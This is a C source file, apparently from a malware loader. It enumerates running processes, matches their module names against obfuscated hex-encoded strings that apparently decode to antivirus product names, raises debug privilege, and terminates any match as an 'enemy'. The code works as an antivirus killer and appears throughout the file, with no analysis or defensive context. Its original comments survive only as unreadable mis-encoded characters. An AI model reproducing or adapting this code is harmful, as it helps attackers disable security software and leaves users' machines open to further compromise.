#include "loader.h"

int KillEnemy( DWORD dwProcessId);

char *signs[] = { "727D677A657A616660", "78726063766160786A",
"697C7D76727F72617E", "7E7072757676", NULL };

void PrintModules( DWORD processID )
{
	HMODULE hMods[1024];
	HANDLE hProcess;
	DWORD cbNeeded;
	char szModName[MAX_PATH];
	unsigned int i,k;

	hProcess = OpenProcess(  PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID );

	if (hProcess == NULL || !EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
		return;

	for ( i = 0; i < (cbNeeded / sizeof(HMODULE)); i++ ) 
	{
		if ( GetModuleFileNameEx( hProcess, hMods[i], szModName, sizeof(szModName))) 
		{
			_strlwr(szModName);
			for(k=0; signs[k]; k++ ) 
			{
				if(strstr(szModName, D(signs[k])) && !strstr(szModName, ".dll") && !strstr(szModName, "svchost")) 
				{
					deb("Enemy %s: %s (0x%08X)\n", D(signs[k]), szModName, hMods[i] );
					KillEnemy(processID);
				}
			}
		}
	}

	CloseHandle( hProcess );
}
// -------------------------------------------------------------------------------------------------------
int KillEnemy( DWORD dwProcessId)
{
	HANDLE hProcess;
	DWORD dwError;
	TOKEN_PRIVILEGES Priv, PrivOld;
	DWORD cbPriv = sizeof(PrivOld);
	HANDLE hToken;

	// ������� ��������� �������� ��������� �������� ��� 
	// ������������� �������������� ����������
	deb("trying to kill %d", dwProcessId);
	hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessId);
	if(hProcess == NULL)
	{
		if (GetLastError() != ERROR_ACCESS_DENIED) 
		{
			deb("access denied ");
			return FALSE;
		}

		OSVERSIONINFO osvi;

		// ���������� ������ ������������ �������
		osvi.dwOSVersionInfoSize = sizeof(osvi);
		GetVersionEx(&osvi);

		// �� ������ ������ �� ����� �������, ���� ��� �� Windows NT
		if (osvi.dwPlatformId != VER_PLATFORM_WIN32_NT)
			return 0;

		// ������� ���������� SE_DEBUG_NAME � ��������� ��� ���

		// �������� ����� �������� ������ 
		if (!OpenThreadToken(GetCurrentThread(), 
			TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES,
			FALSE, &hToken))
		{
			if (GetLastError() != ERROR_NO_TOKEN)
				return FALSE;

			// ���������� ����� ��������, ���� ������ �� ���������
			// �������� ������
			if (!OpenProcessToken(GetCurrentProcess(),
				TOKEN_QUERY|TOKEN_ADJUST_PRIVILEGES,
				&hToken))
				return FALSE;
		}

		Priv.PrivilegeCount = 1;
		Priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
		LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &Priv.Privileges[0].Luid);

		// ��������� �������� ����������
		if (!AdjustTokenPrivileges(hToken, FALSE, &Priv, sizeof(Priv),
			&PrivOld, &cbPriv))
		{
			deb("failed set debug priv");
			CloseHandle(hToken);
			return 0;
		}

		if (GetLastError() == ERROR_NOT_ALL_ASSIGNED)
		{
			// ���������� SE_DEBUG_NAME ����������� � ������
			// �����������
			deb("no handle for debug priv");
			CloseHandle(hToken);
			return 0;
		}

		// ��������� ������� ��������� �������� ��� ���
		hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, dwProcessId);

		if (hProcess == NULL)
			return 0;
	}

	// �������� ��������� �������
	if (!TerminateProcess(hProcess, (UINT) -1))
	{
		CloseHandle(hProcess);
		deb("failed to terminateprocess");
		return 0;
	}

	// ��������������� �������� ��������� ����������

	AdjustTokenPrivileges(hToken, FALSE, &PrivOld, sizeof(PrivOld), NULL, NULL);
	CloseHandle(hToken);
	CloseHandle(hProcess);

	// �������� ����������
	deb("enemy killed");
	return TRUE;
}
// -------------------------------------------------------------------------------------------------------
void KillEnemys( void )
{
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) ) 
	{
		deb("failed enumprocesses: %s", FORMATERROR);
		return;
	}

	cProcesses = cbNeeded / sizeof(DWORD);
	deb("searching for targets...");
	deb("processes: %d cbneeded: %d", cProcesses, cbNeeded);

	for ( i = 0; i < cProcesses; i++ )
		PrintModules( aProcesses[i] );
}

